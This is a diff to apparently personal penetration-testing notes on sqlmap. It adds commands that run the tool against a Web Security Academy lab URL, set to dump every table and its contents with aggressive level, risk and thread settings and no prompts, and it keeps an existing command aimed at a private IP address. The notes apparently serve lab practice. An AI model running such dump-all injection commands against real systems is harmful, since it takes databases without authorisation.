@@ -10,6 +10,14 @@ sqlmap is an open source penetration testing tool that automates the process of 
 ## How to use
 
 
+### Show all Content & Tables without User Interaction
+
+`sqlmap --tables --dump-all --batch -u https://ac021f111ea96192c01c0d2f00b200a8.web-security-academy.net/filter?category=Gifts`
+
+**Plus level 5 & risk 3 & threads 5**
+`sqlmap --tables --dump-all --batch --level 5 --risk 3 --threads 5 -u https://ac021f111ea96192c01c0d2f00b200a8.web-security-academy.net/filter?category=Gifts`
+
+
 ### Query URL with sqlmap
 
 `sqlmap -u http://10.0.166.224/rest/products/search?q=test --level 5 --risk 3`
